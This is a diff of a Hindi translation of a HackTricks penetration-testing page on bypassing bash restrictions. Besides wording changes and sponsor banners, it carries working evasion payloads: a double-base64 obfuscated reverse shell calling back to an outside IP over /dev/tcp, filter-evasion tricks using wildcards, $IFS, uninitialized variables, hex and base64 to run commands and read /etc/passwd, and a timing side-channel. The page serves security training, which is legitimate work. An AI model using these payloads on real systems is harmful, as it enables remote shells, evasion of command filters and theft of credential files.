@@ -2,27 +2,29 @@
 
 <details>
 
-<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>
 
 HackTricks का समर्थन करने के अन्य तरीके:
 
 * यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स देखें**](https://github.com/sponsors/carlospolop)!
 * [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
 * हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
-* **शामिल हों** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** पर **फॉलो** करें 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **अपने हैकिंग ट्रिक्स साझा करें, HackTricks** को PR जमा करके [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में।
+* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** पर **फॉलो** करें 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **अपने हैकिंग ट्रिक्स साझा करें, HackTricks** और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके।
 
 </details>
 
 <figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=bypass-bash-restrictions) का उपयोग करें और **दुनिया के सबसे उन्नत समुदाय उपकरणों** द्वारा संचालित **ऑटोमेटिक वर्कफ़्लो** आसानी से बनाएं।\
-आज ही पहुंचें:
+[**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=bypass-bash-restrictions) का उपयोग करें और **दुनिया के सबसे उन्नत समुदाय उपकरणों** द्वारा संचालित **वर्कफ़्लो** को आसानी से बनाएं और स्वचालित करें।\
+आज ही पहुंच प्राप्त करें:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=bypass-bash-restrictions" %}
 
-## सामान्य प्रतिबंधों को दूर करना
+## सामान्य प्रतिबंधों को दूर करने के तरीके
+
+### रिवर्स शेल
 ```bash
 # Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
 echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
@@ -36,7 +38,7 @@ echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|
 #Then get the out of the rev shell executing inside of it:
 exec >&0
 ```
-### पथों और निषिद्ध शब्दों को दौड़ना
+### पथों और निषिद्ध शब्दों को दौर करें
 ```bash
 # Question mark binary substitution
 /usr/bin/p?ng # /usr/bin/ping
@@ -73,13 +75,18 @@ $(a="WhOaMi";printf %s "${a,,}") #whoami -> transformation (only bash)
 $(rev<<<'imaohw') #whoami
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) #base64
 
-
 # Execution through $0
 echo whoami|$0
 
 # Uninitialized variables: A uninitialized variable equals to null (nothing)
 cat$u /etc$u/passwd$u # Use the uninitialized variable without {} before any symbol
 p${u}i${u}n${u}g # Equals to ping, use {} to put the uninitialized variables between valid characters
+
+# New lines
+p\
+i\
+n\
+g # These 4 lines will equal to ping
 
 # Fake commands
 p$(u)i$(u)n$(u)g # Equals to ping but 3 errors trying to execute "u" are shown
@@ -114,12 +121,6 @@ X=$'cat\x20/etc/passwd'&&$X
 # Using tabs
 echo "ls\x09-l" | bash
 
-# New lines
-p\
-i\
-n\
-g # These 4 lines will equal to ping
-
 # Undefined variables and !
 $u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
 uname!-1\-a # This equals to uname -a
@@ -129,7 +130,7 @@ uname!-1\-a # This equals to uname -a
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```
-### पाइप्स को उमकरना
+### पाइप्स को उमकरें
 ```bash
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
@@ -152,7 +153,7 @@ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 ```bash
 time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 ```
-### एनवायरनमेंट वेरिएबल्स से चार्स प्राप्त करना
+### एनवायरनमेंट वेरिएबल से चार्स प्राप्त करना
 ```bash
 echo ${LS_COLORS:10:1} #;
 echo ${PATH:0:1} #/
@@ -163,8 +164,8 @@ echo ${PATH:0:1} #/
 
 ### बिल्टइंस
 
-यदि आप बाहरी फ़ंक्शनों को नहीं चला सकते और केवल **सीमित संख्या में बिल्टइंस तक पहुंच है** तो RCE प्राप्त करने के लिए कुछ उपयोगी ट्रिक्स हैं। आम तौर पर आपको **सभी** बिल्टइंस का उपयोग नहीं करने की अनुमति होगी, इसलिए आपको जेल को उलटने की कोशिश करने के लिए अपने सभी विकल्पों को जानना चाहिए। विचार [**devploit**](https://twitter.com/devploit) से।\
-सबसे पहले सभी [**शेल बिल्टइंस**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)** की जांच करें।** फिर यहाँ आपके पास कुछ **सुझाव** हैं:
+यदि आप बाहरी फ़ंक्शनों को नहीं चला सकते और केवल **सीमित सेट के बिल्टइंस तक पहुंच** है, तो इसे पास करने के लिए कुछ उपयोगी ट्रिक्स हैं। आम तौर पर आपको **सभी** बिल्टइंस का उपयोग नहीं करने की अनुमति होगी, इसलिए आपको जेल को बाहर करने की कोशिश करने के लिए **अपने सभी विकल्पों को जानना चाहिए**। विचार [**devploit**](https://twitter.com/devploit) से।\
+सबसे पहले सभी [**शेल बिल्टइंस**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)** की जांच करें**। फिर यहाँ आपके पास कुछ **सिफारिशें** हैं:
 ```bash
 # Get list of builtins
 declare builtins
@@ -313,15 +314,15 @@ ln /f*
 'sh x'
 'sh g'
 ```
-## केवल पठनीय/नोएक्सेक/डिस्ट्रोलेस बायपास
+## Read-Only/Noexec/Distroless Bypass
 
-यदि आप **केवल पठनीय और नोएक्स प्रोटेक्शन** वाले फ़ाइल सिस्टम में हैं या फिर एक डिस्ट्रोलेस कंटेनर में हैं, तो भी **विभिन्न बाइनरी को क्रियान्वित करने के तरीके हैं, यहाँ तक कि एक शैल भी!:**
+यदि आप **केवल पढ़ने और noexec सुरक्षा** के साथ फ़ाइल सिस्टम में हैं या फिर एक distroless कंटेनर में हैं, तो भी **किसी भी बाइनरी को निषेधित करने के तरीके हैं, यहाँ तक कि एक शैल भी!:**
 
 {% content-ref url="bypass-fs-protections-read-only-no-exec-distroless/" %}
 [bypass-fs-protections-read-only-no-exec-distroless](bypass-fs-protections-read-only-no-exec-distroless/)
 {% endcontent-ref %}
 
-## चरूट और अन्य जेल्स बायपास
+## Chroot और अन्य जेल्स बाइपास
 
 {% content-ref url="../privilege-escalation/escaping-from-limited-bash.md" %}
 [escaping-from-limited-bash.md](../privilege-escalation/escaping-from-limited-bash.md)
@@ -337,21 +338,21 @@ ln /f*
 <figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=bypass-bash-restrictions) का उपयोग करें और आसानी से **विश्व के सबसे उन्नत समुदाय उपकरणों द्वारा संचालित कार्यप्रवाह** बनाएं और स्वचालित करें।\
-आज ही पहुंच प्राप्त करें:
+[**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=bypass-bash-restrictions) का उपयोग करें और **दुनिया के सबसे उन्नत समुदाय उपकरणों** द्वारा संचालित **कार्यप्रवाहों** को आसानी से निर्मित और स्वचालित करें।\
+आज ही पहुंचें:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=bypass-bash-restrictions" %}
 
 <details>
 
-<summary><strong>जानें जीरो से हीरो तक AWS हैकिंग को</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> से!</strong></summary>
+<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>
 
 HackTricks का समर्थन करने के अन्य तरीके:
 
-* यदि आप अपनी कंपनी का विज्ञापन HackTricks में देखना चाहते हैं या **PDF में HackTricks डाउनलोड** करना चाहते हैं तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
+* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **PDF में HackTricks डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स देखें**](https://github.com/sponsors/carlospolop)!
 * [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
-* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
-* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** पर **फ़ॉलो** करें 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **अपने हैकिंग ट्रिक्स साझा करें, PRs सबमिट करके** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में।
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) का खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
+* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** पर फॉलो** करें।
+* **अपने हैकिंग ट्रिक्स साझा करें, HackTricks** और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks) github repos को PR जमा करके।
 
 </details>
